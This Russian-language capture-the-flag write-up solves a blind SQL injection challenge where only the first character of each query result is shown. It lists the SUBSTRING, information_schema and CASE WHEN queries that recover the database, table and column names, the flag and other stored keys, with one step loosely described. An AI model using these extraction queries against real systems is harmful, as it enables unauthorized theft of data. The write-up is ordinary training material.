Мой друг очень любит защищать свои данные нестандартными способами: сохранять данные в презентациях, прятать ключ от квартиры как хэш SHA256, написанной на салфетке под ковром... Но вот это его opus magnum: любой запрос выводит только первый символ результата. Сможете обойти или останетесь в неведении его секретов?

`http://158.160.205.186:13372`
___
При входе на сайт мы видим, что задачка связана с SQL-инъекцией. Складывая название и суть задачи, понимаем, что дело имеем с **blind SQL injection**.

![[Pasted image 20251118215715.png]]

**Что мы имеем:**
- Есть форма, куда можно вводить только SELECT-запросы. 
- На выходе показывается только первый символ результата. 
- Нужно извлечь данные из базы (в нашем случае флаг), подбирая по одному символу.

В данном задании мы использовали слепой перебор с использованием SUBSTRING, дабы упростить себе перебор. 

Для начала мы принялись узнавать название базы данных, для этого мы использовали команду `SELECT SUBSTRING(DATABASE(), N, 1)`, где SUBSTRING(строка, старт, длина).

Перебрав значения от 1 до 13 в значении N получаем название базы данных — `blind_oracle`

![[Pasted image 20251118215404.png]]

После чего с помощью команды `SELECT SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = 'blind_oracle' ORDER BY table_name LIMIT 1), N, 1)` и перебора значения N от 1 до 6, мы получаем название таблицы - `flags`.

![[Pasted image 20251118221136.png]]

Дальше мы решаем сразу проверить, является ли первый столбец таблицы — `id`. Делаем мы это с помощью команды `SELECT CASE WHEN (SELECT column_name FROM information_schema.columns WHERE table_schema = 'blind_oracle' AND table_name = 'flags' LIMIT 1) = 'id' THEN 'Y' ELSE 'N' END`.

На что сайт нам выдал значение `Y`:

![[Pasted image 20251118221812.png]]

Далее мы начинаем посимвольно проверять второй столбец с помощью команды `SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = 'blind_oracle' AND table_name = 'flags' LIMIT 1 OFFSET 1), N, 1)`, благодаря чему, мы узнаём, что название второго столбца — `flag_name`

Нас заинтересовал этот столбец, и мы решили проверить первое внесённое значение в столбец с помощью `SELECT SUBSTRING((SELECT flag_name FROM flags LIMIT 1), N, 1)`, после чего посимвольно мы получили строку `secret_key`.


Мы решили проверить, есть ли здесь третий столбец. Пройдясь посимвольно по третьему столбцу с помощью `SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = 'blind_oracle' AND table_name = 'flags' LIMIT 1 OFFSET 2), N, 1)` мы получили название `flag_value`.

Далее мы начали просматривать первую строку столбца с помощью команды `SELECT SUBSTRING((SELECT flag_value FROM flags LIMIT 1), 1, 1)` получив после этого флаг.

## `ctfschool{bl1nd_w4lk1ng_0n_th3_sql_1c3}`




C помощью `SELECT SUBSTRING((SELECT flag_name FROM flags LIMIT 1 OFFSET 1), N, 1)`, можно было получить строку `backup_key`.

Поменяв в запросе значение `OFFSET` на 2, мы получили третью строку второго столбца — `admin_key`.

Пройдясь с помощью `SELECT SUBSTRING((SELECT flag_value FROM flags LIMIT 1 OFFSET 1), 1, 1)` мы получили `BACKUP_123456789`, а с `OFFSET 2` — `ADMIN_SPECIAL_ACCESS`.

Мы надеялись на смешную пасхалку, но мы её не получили `:_:`